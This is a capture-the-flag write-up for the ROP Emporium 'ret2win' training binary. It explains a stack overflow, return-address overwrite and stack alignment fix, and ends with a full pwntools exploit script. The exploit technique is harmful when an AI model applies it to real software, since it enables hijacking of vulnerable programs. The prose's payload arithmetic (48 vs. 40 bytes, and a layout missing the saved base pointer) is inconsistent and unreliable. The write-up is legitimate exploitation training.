## Ret2Win
### Writeup
Looking at the ret2win binary in a static analysis, we can see that the program leaves you an unbounded write into a 32 byte buffer and contains a ‘win’ function called ret2win that isn’t called – the goal is to overwrite the return address to jump to ret2win.

To overwrite the return address, we need to fill those 32 bytes, then the 8 bytes from storing the base pointer on the stack, totalling to a payload of 48 bytes total. All we need now is the address of the ret2win function, which we can get from any static analysis tool of your liking, since PLT is disabled. After that you can craft the payload of 40!

However, if you used the payload of 40 bytes of trash + address of ret2win, you may notice that you get into the ret2win function, but don’t get a flag. This is as explained in the [guide](https://ropemporium.com/guide.html) under the MOVAPS issue, but I will summarise here: x86_64 glibc needs the stack to be 16 byte aligned, and to achieve this, the guide recommends we add an extra ret to our ROP chain. Picking literally pick any ret instruction address and put it in the payload such that the payload looks like this, solves this issue: 
> [32 trash bytes] [8 bytes of the extra ret gadget address] [8 bytes for ret2win address]

I chose the ret instruction at 0x00400770.

### Exploit
```
#!/bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./ret2win")
p = elf.process()

ret2win = 0x00400756
random_ret = 0x00400770

payload = flat(
    b"A" * 40,
    random_ret,
    ret2win
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```